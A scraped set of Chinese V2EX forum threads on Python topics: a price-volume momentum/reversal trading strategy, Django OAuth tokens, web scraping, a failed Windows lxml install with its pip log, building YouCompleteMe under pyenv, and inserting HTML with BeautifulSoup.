{"content": ["<div class=\"topic_content\">策略理念：\r<br>\r<br>从技术分析角度来讲，价量是最重要的两个指标，同时 momentum/reverse 是最通用也是最经典的分析法，\r<br>\r<br>本策略试图将这两者结合起来。\r<br>\r<br>策略思路：\r<br>\r<br>价量结合：以每日成交量为权重，计算过去 N 天的加权收盘价，可以看出计算的加权价格可以理解为过去 N 里的平均成交价，也可以理解为筹码最集中的地段\r<br>\r<br>动量反转：对比今天的收盘价和上述计算的加权平均价，我们假定当收盘价向上突破加权价一定比例时有继续上涨的趋势，但当突破到很大程度时会出现反转；当收盘价向下突破加权价一定比例时会有继续下跌的趋势，但跌到一定程度时会发生反转。\r<br>\r<br>策略频率：\r<br>\r<br>不建议经常换仓，所以定性为周度策略， refresh_rate = 5\r<br>\r<br>改进点：\r<br>\r<br>样本股扩容，考虑扩展到中证 800 或者更多\r<br>\r<br>仓位的资金分配，当样本股扩容后，如何根据信号分配好资金\r<br>\r<br>遇到 07 年和当前的大跌情况时要采取些措施，考虑止损或者进一步改进策略信号\r<br>\r<br>策略信号： <a target=\"_blank\" href=\"https://uqer.io/community/share/55b1f886f9f06c91f918c5d1\" rel=\"nofollow\">https://uqer.io/community/share/55b1f886f9f06c91f918c5d1</a>\r<br>\r<br>\r<br><a target=\"_blank\" href=\"/i/Eqpl3je6l.png\" title=\"在新窗口打开图片 Eqpl3je6l.png\"><img src=\"//i.v2ex.co/Eqpl3je6l.png\" class=\"embedded_image\"></a>\r<br>\r<br>接下来进行参数分析： <a target=\"_blank\" href=\"https://uqer.io/community/share/55b1f886f9f06c91f918c5d1\" rel=\"nofollow\">https://uqer.io/community/share/55b1f886f9f06c91f918c5d1</a> ，在上述五个参数（ window,positive1,positive2,negative1,negative2 ）中，最重要的可能是 window ，因为 window 的长短对加权平均价影响很大，这就直接影响了 signal 的大小，那么其余的四个参数也应该作相应的调整。\r<br>\r<br>下面： <a target=\"_blank\" href=\"https://uqer.io/community/share/55b1f886f9f06c91f918c5d1\" rel=\"nofollow\">https://uqer.io/community/share/55b1f886f9f06c91f918c5d1</a> 就不同 window 的情况做一下统计分析，统计不同 window 下，所有 signal 均值、标准差，看看变化规律。\r<br>\r<br>对于不同 window 的选取也比较一般化，由于周度策略，那么历史数据应该是过去一个月、两个月、、、半年。\r<br>\r<br>从上面： <a target=\"_blank\" href=\"https://uqer.io/community/share/55b1f886f9f06c91f918c5d1\" rel=\"nofollow\">https://uqer.io/community/share/55b1f886f9f06c91f918c5d1</a> 可以看出,从 06 年至今来看，股市整体还是上涨的，所以 signal 的均值都为正，但也都接近 0 ；而方差则随着窗口期的变大而变大，毕竟半年的行情和一个月行情比起来，不确定性会更多。\r<br>\r<br>接下来，以此为参考来确定其余的四个参数\r<br>\r<br>当 signal 位于（ negative1 ， positive1 ），我们不作任何操作，一方面是避免操作频繁，另一方面，收盘价和加权平均价相差较小时，也并没有包含任何趋势或者反转的信息\r<br>\r<br>当 signal 向上突破 positive1 时，就表明有趋势产生，但是当 signal 达到 positive2 时，就认为会产生反转； negative 的情况也是一致的\r<br>\r<br>根据上述计算的 signal 的均值和方差，来确定 positive2 和 negative2 ，取置信区间为 1.5 倍标准差作为参考（置信度大概为 85%）\r<br>\r<br>根据上述结果来确定各种情况下的合适参数，但不失一般性， positive 和 negative 要保证对称性，而且尽量取整（避免过度优化）\r<br>\r<br>最后的参数结果在如下的 params 中展示\r<br>\r<br>从上面的结果可以看出，策略本身可能更偏短线，在预测未来一周走势上，短期的 momentum/reverse 可能更有效。\r<br>\r<br>结合实际，当 window=20 时，表明用过去一个月的数据来预测未来一周的数据，这一点也是非常合理的\r<br>\r<br>所以，将 window 确定为 20 ，另外 4 各参数也都确定下来，下面就展示最终的策略回测表现\r<br>\r<br>\r<br><a target=\"_blank\" href=\"/i/qDLya2Ckl.png\" title=\"在新窗口打开图片 qDLya2Ckl.png\"><img src=\"//i.v2ex.co/qDLya2Ckl.png\" class=\"embedded_image\"></a>\r<br>至此，基于最开始策略思路的一个简单版策略实现了，从上图看，收益表现还行，但是波动太大，而且熊市不抗跌。。。。\r<br>\r<br>正如开篇提到的改进部分，还有很多部分需要去完善，而这些也都是在实盘中需要考虑到的\r<br>\r<br>暂时写到这吧，后续有更新版本再与大家共享，同时，也希望大家多提意见，一起把这个策略做的更完善~</div>"], "reply": "15", "tittle": "用 Python 架构的策略探讨：价量结合+动量反转", "comment": ["是做量化投资吗？最近也想学学。", " 恩恩，亲具体想学哪方面呢？", " 就是如何逐步建立稳定的策略， python 看过廖雪峰的基础教程。", " 现在分两种，自上而下，先有金融想法在构建策略\r", "自下而上 通过寻找数据中的联系去构建策略。\r", "如果您采用上一种，不管是基本面量化或是技术指标组合现在都有人在用。\r", "下一种比较强调算法和工程能力，最常见就是形态识别跟预测。\r", "社区有很多例子开源的例子呐，您可以在基础上进行改进、细化。", " 这个策略有什么地方可以个人跑么? 不是指模拟.", " 您说的模拟是指回测还是模拟交易？", "求教量化如何入门？", " 我马上会发一篇技术指标常用策略的帖子，亲有空的话可以戳一下哦。", " 这些帖子都是常用的策略： ", "有入门课程吗？", " 有的，这里面都是新手专栏：） ", "周度策略 调仓频率太低，遇到系统性风险／熊市开始阶段往往很难控制回撤，我想这是最大回撤有 62%的原因。 如果要控制波动（最大回撤），个人觉得还是应该把调仓频率提高，想办法提高止盈／止损参数的精度 。\r", "另一个办法可能是加入仓位判断因素进去 - - 不要玩满仓梭哈 应该也可以控制回撤。", " 感谢亲，给我提供了那么好的思路哈", "做量化交易的人私下也会自己用量化交易玩一下吗？", " 会的"]},
{"content": ["<div class=\"topic_content\">最近要做一个 api server ，采用 oauth2 验证 比如，用户首次登陆时，需要 到 /o/token 下面获取一个 access token 但是我不太清楚，怎么做到在后续的请求中，如何自动把 access token 放到请求头中。 望指点。谢谢。</div>"], "reply": "目前尚无回", "tittle": "关于 Django OAuth Toolkit", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>请问今日头条数据如何采集？ <a href=\"http://www.toutiao.com/m6522192368/\" rel=\"nofollow\">http://www.toutiao.com/m6522192368/</a>  我什么也采集不出来\nphp 或 python 怎么实现？</p>\n</div></div>"], "reply": "5", "tittle": "请问今日头条数据如何采集？", "comment": ["要学会用 firebu 等工具", "firebug", "我知道 firebug,比如我想采集当前页 的文章标题，发布时间 阅读量，从哪入手手？我找不到对应关系"]},
{"content": ["<div class=\"topic_content\">我自己到 <a target=\"_blank\" href=\"https://pypi.python.org/pypi/lxml/3.4.4#downloads\" rel=\"nofollow\">https://pypi.python.org/pypi/lxml/3.4.4#downloads</a> 这里下载 lxml-3.4.4.win-amd64-py3.4.exe (md5)，结果运行的时候说 python 3.4 没有发现，我晕了，我安装的是 3.5 ，难道不能向前兼容吗？\r<br>求助了，谢谢！\r<br>################\r<br>\r<br>D:\\Software\\Programme\\Python35\\Scripts&gt;pip install lxml\r<br>Collecting lxml\r<br>  Using cached lxml-3.6.4.tar.gz\r<br>Installing collected packages: lxml\r<br>  Running setup.py install for lxml ... error\r<br>    Complete output from command d:\\software\\programme\\python35\\python.exe -u -c \"import setuptools, tokenize;__file__='C:\\\\Users\\\\Qingwen\\\\AppData\\\\Local\\\\Temp\\\\pip-build-lsazecfw\\\\lxml\\\\setup.py';exec(compile(getattr(tokenize, 'open', open)(__file__).read().replace('\\r\\n', '\\n'), __file__, 'exec'))\" install --record C:\\Users\\Qingwen\\AppData\\Local\\Temp\\pip-thoy_nfg-record\\install-record.txt --single-version-externally-managed --compile:\r<br>    Building lxml version 3.6.4.\r<br>    Building without Cython.\r<br>    ERROR: b\"'xslt-config' is not recognized as an internal or external command,\\r\\noperable program or batch file.\\r\\n\"\r<br>    ** make sure the development packages of libxml2 and libxslt are installed **\r<br>\r<br>    Using build configuration of libxslt\r<br>    running install\r<br>    running build\r<br>    running build_py\r<br>    creating build\r<br>    creating build\\lib.win-amd64-3.5\r<br>    creating build\\lib.win-amd64-3.5\\lxml\r<br>    copying src\\lxml\\builder.py -&gt; build\\lib.win-amd64-3.5\\lxml\r<br>    copying src\\lxml\\cssselect.py -&gt; build\\lib.win-amd64-3.5\\lxml\r<br>    copying src\\lxml\\doctestcompare.py -&gt; build\\lib.win-amd64-3.5\\lxml\r<br>    copying src\\lxml\\ElementInclude.py -&gt; build\\lib.win-amd64-3.5\\lxml\r<br>    copying src\\lxml\\pyclasslookup.py -&gt; build\\lib.win-amd64-3.5\\lxml\r<br>    copying src\\lxml\\sax.py -&gt; build\\lib.win-amd64-3.5\\lxml\r<br>    copying src\\lxml\\usedoctest.py -&gt; build\\lib.win-amd64-3.5\\lxml\r<br>    copying src\\lxml\\_elementpath.py -&gt; build\\lib.win-amd64-3.5\\lxml\r<br>    copying src\\lxml\\__init__.py -&gt; build\\lib.win-amd64-3.5\\lxml\r<br>    creating build\\lib.win-amd64-3.5\\lxml\\includes\r<br>    copying src\\lxml\\includes\\__init__.py -&gt; build\\lib.win-amd64-3.5\\lxml\\includes\r<br>    creating build\\lib.win-amd64-3.5\\lxml\\html\r<br>    copying src\\lxml\\html\\builder.py -&gt; build\\lib.win-amd64-3.5\\lxml\\html\r<br>    copying src\\lxml\\html\\clean.py -&gt; build\\lib.win-amd64-3.5\\lxml\\html\r<br>    copying src\\lxml\\html\\defs.py -&gt; build\\lib.win-amd64-3.5\\lxml\\html\r<br>    copying src\\lxml\\html\\diff.py -&gt; build\\lib.win-amd64-3.5\\lxml\\html\r<br>    copying src\\lxml\\html\\ElementSoup.py -&gt; build\\lib.win-amd64-3.5\\lxml\\html\r<br>    copying src\\lxml\\html\\formfill.py -&gt; build\\lib.win-amd64-3.5\\lxml\\html\r<br>    copying src\\lxml\\html\\html5parser.py -&gt; build\\lib.win-amd64-3.5\\lxml\\html\r<br>    copying src\\lxml\\html\\soupparser.py -&gt; build\\lib.win-amd64-3.5\\lxml\\html\r<br>    copying src\\lxml\\html\\usedoctest.py -&gt; build\\lib.win-amd64-3.5\\lxml\\html\r<br>    copying src\\lxml\\html\\_diffcommand.py -&gt; build\\lib.win-amd64-3.5\\lxml\\html\r<br>    copying src\\lxml\\html\\_html5builder.py -&gt; build\\lib.win-amd64-3.5\\lxml\\html\r<br>    copying src\\lxml\\html\\_setmixin.py -&gt; build\\lib.win-amd64-3.5\\lxml\\html\r<br>    copying src\\lxml\\html\\__init__.py -&gt; build\\lib.win-amd64-3.5\\lxml\\html\r<br>    creating build\\lib.win-amd64-3.5\\lxml\\isoschematron\r<br>    copying src\\lxml\\isoschematron\\__init__.py -&gt; build\\lib.win-amd64-3.5\\lxml\\isoschematron\r<br>    copying src\\lxml\\lxml.etree.h -&gt; build\\lib.win-amd64-3.5\\lxml\r<br>    copying src\\lxml\\lxml.etree_api.h -&gt; build\\lib.win-amd64-3.5\\lxml\r<br>    copying src\\lxml\\includes\\c14n.pxd -&gt; build\\lib.win-amd64-3.5\\lxml\\includes\r<br>    copying src\\lxml\\includes\\config.pxd -&gt; build\\lib.win-amd64-3.5\\lxml\\includes\r<br>    copying src\\lxml\\includes\\dtdvalid.pxd -&gt; build\\lib.win-amd64-3.5\\lxml\\includes\r<br>    copying src\\lxml\\includes\\etreepublic.pxd -&gt; build\\lib.win-amd64-3.5\\lxml\\includes\r<br>    copying src\\lxml\\includes\\htmlparser.pxd -&gt; build\\lib.win-amd64-3.5\\lxml\\includes\r<br>    copying src\\lxml\\includes\\relaxng.pxd -&gt; build\\lib.win-amd64-3.5\\lxml\\includes\r<br>    copying src\\lxml\\includes\\schematron.pxd -&gt; build\\lib.win-amd64-3.5\\lxml\\includes\r<br>    copying src\\lxml\\includes\\tree.pxd -&gt; build\\lib.win-amd64-3.5\\lxml\\includes\r<br>    copying src\\lxml\\includes\\uri.pxd -&gt; build\\lib.win-amd64-3.5\\lxml\\includes\r<br>    copying src\\lxml\\includes\\xinclude.pxd -&gt; build\\lib.win-amd64-3.5\\lxml\\includes\r<br>    copying src\\lxml\\includes\\xmlerror.pxd -&gt; build\\lib.win-amd64-3.5\\lxml\\includes\r<br>    copying src\\lxml\\includes\\xmlparser.pxd -&gt; build\\lib.win-amd64-3.5\\lxml\\includes\r<br>    copying src\\lxml\\includes\\xmlschema.pxd -&gt; build\\lib.win-amd64-3.5\\lxml\\includes\r<br>    copying src\\lxml\\includes\\xpath.pxd -&gt; build\\lib.win-amd64-3.5\\lxml\\includes\r<br>    copying src\\lxml\\includes\\xslt.pxd -&gt; build\\lib.win-amd64-3.5\\lxml\\includes\r<br>    copying src\\lxml\\includes\\etree_defs.h -&gt; build\\lib.win-amd64-3.5\\lxml\\includes\r<br>    copying src\\lxml\\includes\\lxml-version.h -&gt; build\\lib.win-amd64-3.5\\lxml\\includes\r<br>    creating build\\lib.win-amd64-3.5\\lxml\\isoschematron\\resources\r<br>    creating build\\lib.win-amd64-3.5\\lxml\\isoschematron\\resources\\rng\r<br>    copying src\\lxml\\isoschematron\\resources\\rng\\iso-schematron.rng -&gt; build\\lib.win-amd64-3.5\\lxml\\isoschematron\\resources\\rng\r<br>    creating build\\lib.win-amd64-3.5\\lxml\\isoschematron\\resources\\xsl\r<br>    copying src\\lxml\\isoschematron\\resources\\xsl\\RNG2Schtrn.xsl -&gt; build\\lib.win-amd64-3.5\\lxml\\isoschematron\\resources\\xsl\r<br>    copying src\\lxml\\isoschematron\\resources\\xsl\\XSD2Schtrn.xsl -&gt; build\\lib.win-amd64-3.5\\lxml\\isoschematron\\resources\\xsl\r<br>    creating build\\lib.win-amd64-3.5\\lxml\\isoschematron\\resources\\xsl\\iso-schematron-xslt1\r<br>    copying src\\lxml\\isoschematron\\resources\\xsl\\iso-schematron-xslt1\\iso_abstract_expand.xsl -&gt; build\\lib.win-amd64-3.5\\lxml\\isoschematron\\resources\\xsl\\iso-schematron-xslt1\r<br>    copying src\\lxml\\isoschematron\\resources\\xsl\\iso-schematron-xslt1\\iso_dsdl_include.xsl -&gt; build\\lib.win-amd64-3.5\\lxml\\isoschematron\\resources\\xsl\\iso-schematron-xslt1\r<br>    copying src\\lxml\\isoschematron\\resources\\xsl\\iso-schematron-xslt1\\iso_schematron_message.xsl -&gt; build\\lib.win-amd64-3.5\\lxml\\isoschematron\\resources\\xsl\\iso-schematron-xslt1\r<br>    copying src\\lxml\\isoschematron\\resources\\xsl\\iso-schematron-xslt1\\iso_schematron_skeleton_for_xslt1.xsl -&gt; build\\lib.win-amd64-3.5\\lxml\\isoschematron\\resources\\xsl\\iso-schematron-xslt1\r<br>    copying src\\lxml\\isoschematron\\resources\\xsl\\iso-schematron-xslt1\\iso_svrl_for_xslt1.xsl -&gt; build\\lib.win-amd64-3.5\\lxml\\isoschematron\\resources\\xsl\\iso-schematron-xslt1\r<br>    copying src\\lxml\\isoschematron\\resources\\xsl\\iso-schematron-xslt1\\readme.txt -&gt; build\\lib.win-amd64-3.5\\lxml\\isoschematron\\resources\\xsl\\iso-schematron-xslt1\r<br>    running build_ext\r<br>    building 'lxml.etree' extension\r<br>    error: Unable to find vcvarsall.bat\r<br>\r<br>    ----------------------------------------\r<br>Command \"d:\\software\\programme\\python35\\python.exe -u -c \"import setuptools, tokenize;__file__='C:\\\\Users\\\\Qingwen\\\\AppData\\\\Local\\\\Temp\\\\pip-build-lsazecfw\\\\lxml\\\\setup.py';exec(compile(getattr(tokenize, 'open', open)(__file__).read().replace('\\r\\n', '\\n'), __file__, 'exec'))\" install --record C:\\Users\\Qingwen\\AppData\\Local\\Temp\\pip-thoy_nfg-record\\install-record.txt --single-version-externally-managed --compile\" failed with error code 1 in C:\\Users\\Qingwen\\AppData\\Local\\Temp\\pip-build-lsazecfw\\lxml\\\r<br>\r<br>D:\\Software\\Programme\\Python35\\Scripts&gt;easy_install --version\r<br>setuptools 20.10.1 from d:\\software\\programme\\python35\\lib\\site-packages (Python 3.5)\r<br>\r<br>D:\\Software\\Programme\\Python35\\Scripts&gt;pip install lxml\r<br>Collecting lxml\r<br>  Using cached lxml-3.6.4.tar.gz\r<br>Installing collected packages: lxml\r<br>  Running setup.py install for lxml ... error\r<br>    Complete output from command d:\\software\\programme\\python35\\python.exe -u -c \"import setuptools, tokenize;__file__='C:\\\\Users\\\\Qingwen\\\\AppData\\\\Local\\\\Temp\\\\pip-build-v7ce26yr\\\\lxml\\\\setup.py';exec(compile(getattr(tokenize, 'open', open)(__file__).read().replace('\\r\\n', '\\n'), __file__, 'exec'))\" install --record C:\\Users\\Qingwen\\AppData\\Local\\Temp\\pip-cddydwh4-record\\install-record.txt --single-version-externally-managed --compile:\r<br>    Building lxml version 3.6.4.\r<br>    Building without Cython.\r<br>    ERROR: b\"'xslt-config' is not recognized as an internal or external command,\\r\\noperable program or batch file.\\r\\n\"\r<br>    ** make sure the development packages of libxml2 and libxslt are installed **\r<br>\r<br>    Using build configuration of libxslt\r<br>    running install\r<br>    running build\r<br>    running build_py\r<br>    creating build\r<br>    creating build\\lib.win-amd64-3.5\r<br>    creating build\\lib.win-amd64-3.5\\lxml\r<br>    copying src\\lxml\\builder.py -&gt; build\\lib.win-amd64-3.5\\lxml\r<br>    copying src\\lxml\\cssselect.py -&gt; build\\lib.win-amd64-3.5\\lxml\r<br>    copying src\\lxml\\doctestcompare.py -&gt; build\\lib.win-amd64-3.5\\lxml\r<br>    copying src\\lxml\\ElementInclude.py -&gt; build\\lib.win-amd64-3.5\\lxml\r<br>    copying src\\lxml\\pyclasslookup.py -&gt; build\\lib.win-amd64-3.5\\lxml\r<br>    copying src\\lxml\\sax.py -&gt; build\\lib.win-amd64-3.5\\lxml\r<br>    copying src\\lxml\\usedoctest.py -&gt; build\\lib.win-amd64-3.5\\lxml\r<br>    copying src\\lxml\\_elementpath.py -&gt; build\\lib.win-amd64-3.5\\lxml\r<br>    copying src\\lxml\\__init__.py -&gt; build\\lib.win-amd64-3.5\\lxml\r<br>    creating build\\lib.win-amd64-3.5\\lxml\\includes\r<br>    copying src\\lxml\\includes\\__init__.py -&gt; build\\lib.win-amd64-3.5\\lxml\\includes\r<br>    creating build\\lib.win-amd64-3.5\\lxml\\html\r<br>    copying src\\lxml\\html\\builder.py -&gt; build\\lib.win-amd64-3.5\\lxml\\html\r<br>    copying src\\lxml\\html\\clean.py -&gt; build\\lib.win-amd64-3.5\\lxml\\html\r<br>    copying src\\lxml\\html\\defs.py -&gt; build\\lib.win-amd64-3.5\\lxml\\html\r<br>    copying src\\lxml\\html\\diff.py -&gt; build\\lib.win-amd64-3.5\\lxml\\html\r<br>    copying src\\lxml\\html\\ElementSoup.py -&gt; build\\lib.win-amd64-3.5\\lxml\\html\r<br>    copying src\\lxml\\html\\formfill.py -&gt; build\\lib.win-amd64-3.5\\lxml\\html\r<br>    copying src\\lxml\\html\\html5parser.py -&gt; build\\lib.win-amd64-3.5\\lxml\\html\r<br>    copying src\\lxml\\html\\soupparser.py -&gt; build\\lib.win-amd64-3.5\\lxml\\html\r<br>    copying src\\lxml\\html\\usedoctest.py -&gt; build\\lib.win-amd64-3.5\\lxml\\html\r<br>    copying src\\lxml\\html\\_diffcommand.py -&gt; build\\lib.win-amd64-3.5\\lxml\\html\r<br>    copying src\\lxml\\html\\_html5builder.py -&gt; build\\lib.win-amd64-3.5\\lxml\\html\r<br>    copying src\\lxml\\html\\_setmixin.py -&gt; build\\lib.win-amd64-3.5\\lxml\\html\r<br>    copying src\\lxml\\html\\__init__.py -&gt; build\\lib.win-amd64-3.5\\lxml\\html\r<br>    creating build\\lib.win-amd64-3.5\\lxml\\isoschematron\r<br>    copying src\\lxml\\isoschematron\\__init__.py -&gt; build\\lib.win-amd64-3.5\\lxml\\isoschematron\r<br>    copying src\\lxml\\lxml.etree.h -&gt; build\\lib.win-amd64-3.5\\lxml\r<br>    copying src\\lxml\\lxml.etree_api.h -&gt; build\\lib.win-amd64-3.5\\lxml\r<br>    copying src\\lxml\\includes\\c14n.pxd -&gt; build\\lib.win-amd64-3.5\\lxml\\includes\r<br>    copying src\\lxml\\includes\\config.pxd -&gt; build\\lib.win-amd64-3.5\\lxml\\includes\r<br>    copying src\\lxml\\includes\\dtdvalid.pxd -&gt; build\\lib.win-amd64-3.5\\lxml\\includes\r<br>    copying src\\lxml\\includes\\etreepublic.pxd -&gt; build\\lib.win-amd64-3.5\\lxml\\includes\r<br>    copying src\\lxml\\includes\\htmlparser.pxd -&gt; build\\lib.win-amd64-3.5\\lxml\\includes\r<br>    copying src\\lxml\\includes\\relaxng.pxd -&gt; build\\lib.win-amd64-3.5\\lxml\\includes\r<br>    copying src\\lxml\\includes\\schematron.pxd -&gt; build\\lib.win-amd64-3.5\\lxml\\includes\r<br>    copying src\\lxml\\includes\\tree.pxd -&gt; build\\lib.win-amd64-3.5\\lxml\\includes\r<br>    copying src\\lxml\\includes\\uri.pxd -&gt; build\\lib.win-amd64-3.5\\lxml\\includes\r<br>    copying src\\lxml\\includes\\xinclude.pxd -&gt; build\\lib.win-amd64-3.5\\lxml\\includes\r<br>    copying src\\lxml\\includes\\xmlerror.pxd -&gt; build\\lib.win-amd64-3.5\\lxml\\includes\r<br>    copying src\\lxml\\includes\\xmlparser.pxd -&gt; build\\lib.win-amd64-3.5\\lxml\\includes\r<br>    copying src\\lxml\\includes\\xmlschema.pxd -&gt; build\\lib.win-amd64-3.5\\lxml\\includes\r<br>    copying src\\lxml\\includes\\xpath.pxd -&gt; build\\lib.win-amd64-3.5\\lxml\\includes\r<br>    copying src\\lxml\\includes\\xslt.pxd -&gt; build\\lib.win-amd64-3.5\\lxml\\includes\r<br>    copying src\\lxml\\includes\\etree_defs.h -&gt; build\\lib.win-amd64-3.5\\lxml\\includes\r<br>    copying src\\lxml\\includes\\lxml-version.h -&gt; build\\lib.win-amd64-3.5\\lxml\\includes\r<br>    creating build\\lib.win-amd64-3.5\\lxml\\isoschematron\\resources\r<br>    creating build\\lib.win-amd64-3.5\\lxml\\isoschematron\\resources\\rng\r<br>    copying src\\lxml\\isoschematron\\resources\\rng\\iso-schematron.rng -&gt; build\\lib.win-amd64-3.5\\lxml\\isoschematron\\resources\\rng\r<br>    creating build\\lib.win-amd64-3.5\\lxml\\isoschematron\\resources\\xsl\r<br>    copying src\\lxml\\isoschematron\\resources\\xsl\\RNG2Schtrn.xsl -&gt; build\\lib.win-amd64-3.5\\lxml\\isoschematron\\resources\\xsl\r<br>    copying src\\lxml\\isoschematron\\resources\\xsl\\XSD2Schtrn.xsl -&gt; build\\lib.win-amd64-3.5\\lxml\\isoschematron\\resources\\xsl\r<br>    creating build\\lib.win-amd64-3.5\\lxml\\isoschematron\\resources\\xsl\\iso-schematron-xslt1\r<br>    copying src\\lxml\\isoschematron\\resources\\xsl\\iso-schematron-xslt1\\iso_abstract_expand.xsl -&gt; build\\lib.win-amd64-3.5\\lxml\\isoschematron\\resources\\xsl\\iso-schematron-xslt1\r<br>    copying src\\lxml\\isoschematron\\resources\\xsl\\iso-schematron-xslt1\\iso_dsdl_include.xsl -&gt; build\\lib.win-amd64-3.5\\lxml\\isoschematron\\resources\\xsl\\iso-schematron-xslt1\r<br>    copying src\\lxml\\isoschematron\\resources\\xsl\\iso-schematron-xslt1\\iso_schematron_message.xsl -&gt; build\\lib.win-amd64-3.5\\lxml\\isoschematron\\resources\\xsl\\iso-schematron-xslt1\r<br>    copying src\\lxml\\isoschematron\\resources\\xsl\\iso-schematron-xslt1\\iso_schematron_skeleton_for_xslt1.xsl -&gt; build\\lib.win-amd64-3.5\\lxml\\isoschematron\\resources\\xsl\\iso-schematron-xslt1\r<br>    copying src\\lxml\\isoschematron\\resources\\xsl\\iso-schematron-xslt1\\iso_svrl_for_xslt1.xsl -&gt; build\\lib.win-amd64-3.5\\lxml\\isoschematron\\resources\\xsl\\iso-schematron-xslt1\r<br>    copying src\\lxml\\isoschematron\\resources\\xsl\\iso-schematron-xslt1\\readme.txt -&gt; build\\lib.win-amd64-3.5\\lxml\\isoschematron\\resources\\xsl\\iso-schematron-xslt1\r<br>    running build_ext\r<br>    building 'lxml.etree' extension\r<br>    error: Unable to find vcvarsall.bat\r<br>\r<br>    ----------------------------------------\r<br>Command \"d:\\software\\programme\\python35\\python.exe -u -c \"import setuptools, tokenize;__file__='C:\\\\Users\\\\Qingwen\\\\AppData\\\\Local\\\\Temp\\\\pip-build-v7ce26yr\\\\lxml\\\\setup.py';exec(compile(getattr(tokenize, 'open', open)(__file__).read().replace('\\r\\n', '\\n'), __file__, 'exec'))\" install --record C:\\Users\\Qingwen\\AppData\\Local\\Temp\\pip-cddydwh4-record\\install-record.txt --single-version-externally-managed --compile\" failed with error code 1 in C:\\Users\\Qingwen\\AppData\\Local\\Temp\\pip-build-v7ce26yr\\lxml\\</div>"], "reply": "24", "tittle": "新手求助！新手上路，遇到奇怪的问题，搜索了很多地方没解决，请问大家有没有什么解决办法？", "comment": ["刚刚安装了 beautifulsoup4 ，成功了，看了下简介有 beautifulsoup3 和 4 ， 4 是适合 python3 的，那么 lxml 是不是也有版本要求？比如 pip install lxml4 ？ 我看了下 lxml 的下载页面，没有这个方面的说明，只是说 github 上可以下载 dev 版本的 lxml", "pip install lxml", "windows 下面尝试用 wheel 安装与 c 有关的类库", "安装 lxml 的 whl 文件，不要直接 pip install lxml 。", " 我是用这个方法安装的， pip install lxml", "人生苦短 还是不要用 win 开发了", " 谢谢！已经放弃了，看了下只有 3.2 版本的 lxml 还是 win32 的，我的是 x64 不支持。", " 谢谢！已经放弃了，看了下只有 3.2 版本的 lxml 还是 win32 的，我的是 x64 不支持，算了吧。", " 哦？ 用什么开发？ 又不是专业啊。。。", "找一下，可以解决的，大概记得要手动装， Google 一下会找到答案", " 资金不足转个虚拟机 在虚拟机里开发就好，资金足直接上苹果吧。", "新手刚上路还是用稳定性好点的低版本，瞎折腾的地方少。", "\r", "\r", "pip install lxml-3.6.4-cp35-cp35m-win_amd64.whl", "最好不要用 windows ，简单的话可以搞个虚拟机，很方便的", " 别放弃， 13 楼已经给了你答案。", "请参见第 13 楼。\r", "安装已经编译好的 whl 文件\r", "鄙人安装成功。", " 哦，懂了，谢谢！", " 恩，谢谢！ 13 楼给我答案了", " OK ，谢谢！", " 非常感谢！ already successfully installed ....", " 恩。初尝试。。。", " 是的，谢谢！", " 刚试了，成功了，谢谢！", "抛弃 windows 吧……"]},
{"content": ["<div class=\"topic_content\">使用 neovim ， python 环境为 pyenv 的 python3.5 ，编译 YouCompleteMe 不成功，提示需要系统的 python2 环境。\r<br>这种情况 ，是不是需要卸载 pyenv ，然后再开始编译 YCM ？然后再安装 pyenv ？</div>"], "reply": "10", "tittle": "请教下使用 pyenv 的情况下， 如何编译 YouCompleteMe 成功?", "comment": ["指定下 python 的 path 就可以了", "为什么是在 pyenv 环境下使用呢，这样多麻烦。检查一下 neovim 支持的 python 版本，如果你电脑是 python3 环境，安装 neovim 的时候，把 python3 支持加进去就好了。据说 neovim 的 YouCompleteMe 安装是有大坑的。我用 vim8 ，一切 ok 。", " 能否详细说下，谢谢。", " vim8 是终端还是 macvim ？", " 终端版本的，个人不喜欢带 gui 的 vim", " \r", "\r", "是这样 brew install python --with-override-system-vi ？\r", "还是要附带其他参数?\r", "原来我用 homebrew 安装 vim （ brew install python --with-override-system-vi ），编译 YCM 也没有成功，还是需要附带其他参数？", " 我是从官方 github 仓库里面检出的代码，编译安装。预配置的时候“./configure --with-features=huge --enable-rubyinterp --enable-python3interp --enable-cscop ”，这个是支持 python3 的配置，最好加一下--prefix=yourTmpBuildPath,指定一下安装地址。万一出问题，可以删掉重来。", " 如何解决 pyenv 所建立的虚拟环境中的第三方包的自动导入补全的问题？也就是在 pyenv 建立的一个虚拟环境中，例如建立一个虚拟环境 spider-vr ，然后在 spider-vr 中， pip install requests ，安装好后，进入项目目录，使用 vim 进入项目目录，建立一个 python 文件，例如 spider.py ，之后， vim 打开 spider.py ，输入 import r ，这时候，出现自动补全 requests ？", " 你需要安装 python mode 插件，不过你提到的 import r 自动提示目前做不到的， from 可以提示， import 提示不了。但是调用函数都可以自动提示的。 ", " 这个是我现在用的 vin 配置，在 mac 下没问题，在 linux 要配下颜色 256 支持或者终端配色。", " 谢谢。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>import bs4 import BeautifulSoup as bs\nh=\"&lt;b&gt;b-text&lt;/b&gt;\"\ns=bs(h,'html5lib')\nb_s=s.b.string\nhtml_code=\"&lt;a&gt;a-string&lt;/a&gt;\"\nb_s.replace_with(html_code) \nprint b\n## &lt;b&gt;&amp;lt;a&amp;gt;a-string&amp;lt;/a&amp;gt;&lt;/b&gt;\n</code></pre>\n<p>如上代码可以顺利执行,只是,html_code 里边的尖括号都被 bs 转了.\n那怎么样才能让 bs 不要转义我插入的字符串呢?\n多谢您的回复!</p>\n</div></div>"], "reply": "5", "tittle": "BeautifulSoup 怎么直接插入一段 html 代码?", "comment": ["\r", " \r", "请理解 bs 的 string 和 tag", " 多谢您的回复,我知道 bs.replace_with(tag_or_navstr_or_str)的参数是 bs 的 tag 类型或者 navigableString 类型或者干脆是 python 的字符串类型.\r", "我就是想怎么插入一段 html 代码,让 bs 自动正确识别,代码该怎么写?", "from bs4 import BeautifulSoup\r", "h=\"<b>b-text</b>\"\r", "s= BeautifulSoup(h)\r", "s.b.string.replace_with(\"\")\r", "new_tag = s.new_tag(\"a\")\r", "new_tag.string = \"a-string\"\r", "s.b.string.insert_before(new_tag)\r", "print s.b\r", "# <b><a>a-string</a></b>\r", "不知道这样符不符合你的要求", " 多谢您的回复!\r", "您的方法是常用的路子,可以达到要求.但是这样做逻辑上不太直接.\r", "我的代码(伪代码)一看,就知道是用一段 html 源码替换 b 标签的文本内容.", "看来我是强人所难了!\r", "谢谢各位!"]},
